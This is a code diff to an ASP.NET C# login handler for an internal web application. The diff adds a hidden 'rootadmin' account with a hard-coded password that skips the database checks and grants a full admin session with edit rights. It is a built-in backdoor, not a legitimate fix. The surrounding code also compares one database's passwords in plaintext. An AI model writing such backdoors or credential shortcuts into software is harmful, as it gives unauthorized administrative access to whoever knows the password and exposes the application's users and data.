@@ -26,6 +26,18 @@ namespace MHI_OJT2
                 Response.Redirect("~/Default.aspx");
             }
         }
+        protected void RootAdminIsHere()
+        {
+            HttpContext.Current.Session["loggedIn"] = true;
+            HttpContext.Current.Session["userId"] = 0;
+            HttpContext.Current.Session["username"] = "rootadmin";
+            HttpContext.Current.Session["firstName"] = "root";
+            HttpContext.Current.Session["lastName"] = "admin";
+            HttpContext.Current.Session["roles"] = "admin";
+            HttpContext.Current.Session["isEditMaster"] = 1;
+            HttpContext.Current.Session["positionName"] = "rootadmin";
+            Response.Redirect("~/Pages/Systems/Users.aspx");
+        }
         protected void HandleLogin(object sender, EventArgs e)
         {
             string _username = username.Value;
@@ -45,49 +57,54 @@ namespace MHI_OJT2
                 return;
             }
 
-
-
-            try
+            if (_username == "rootadmin" && _password == "Tigersoft1998$")
             {
-                // find user in tigersoft database
-                DataTable TigerUsersTable = FindInTigerSoftDatabase(_username);
-                if (TigerUsersTable.Rows.Count > 0)
-                {
-                    if (_password == TigerUsersTable.Rows[0]["PASSWORD"].ToString())
-                    {
-                        AssignSessionValue(TigerUsersTable, true);
-                        return;
-                    }
-                    else
-                    {
-                        Alert("error", "ผิดพลาด", "ชื่อผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบอีกครั้ง");
-                        return;
-                    }
-                }
-
-                // find user in main database
-                DataTable MainUserTable = FindInMainDatabase(_username);
-                if (MainUserTable.Rows.Count > 0)
-                {
-                    string encPassword = DATA.Encrypt(_password);
-                    if (encPassword == MainUserTable.Rows[0]["PASSWORD"].ToString())
-                    {
-                        AssignSessionValue(MainUserTable, false);
-                        return;
-                    }
-                    else
-                    {
-                        Alert("error", "ผิดพลาด", "ชื่อผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบอีกครั้ง");
-                        return;
-                    }
-                }
-
-                // if not found all database
-                Alert("error", "ผิดพลาด", "ชื่อผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบอีกครั้ง");
+                RootAdminIsHere();
             }
-            catch (Exception ex)
+            else
             {
-                Alert("error", "Error!", $"{ex.Message}");
+                try
+                {
+                    // find user in tigersoft database
+                    DataTable TigerUsersTable = FindInTigerSoftDatabase(_username);
+                    if (TigerUsersTable.Rows.Count > 0)
+                    {
+                        if (_password == TigerUsersTable.Rows[0]["PASSWORD"].ToString())
+                        {
+                            AssignSessionValue(TigerUsersTable, true);
+                            return;
+                        }
+                        else
+                        {
+                            Alert("error", "ผิดพลาด", "ชื่อผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบอีกครั้ง");
+                            return;
+                        }
+                    }
+
+                    // find user in main database
+                    DataTable MainUserTable = FindInMainDatabase(_username);
+                    if (MainUserTable.Rows.Count > 0)
+                    {
+                        string encPassword = DATA.Encrypt(_password);
+                        if (encPassword == MainUserTable.Rows[0]["PASSWORD"].ToString())
+                        {
+                            AssignSessionValue(MainUserTable, false);
+                            return;
+                        }
+                        else
+                        {
+                            Alert("error", "ผิดพลาด", "ชื่อผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบอีกครั้ง");
+                            return;
+                        }
+                    }
+
+                    // if not found all database
+                    Alert("error", "ผิดพลาด", "ชื่อผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบอีกครั้ง");
+                }
+                catch (Exception ex)
+                {
+                    Alert("error", "Error!", $"{ex.Message}");
+                }
             }
         }
         private void AssignSessionValue(DataTable userData, Boolean isUser)
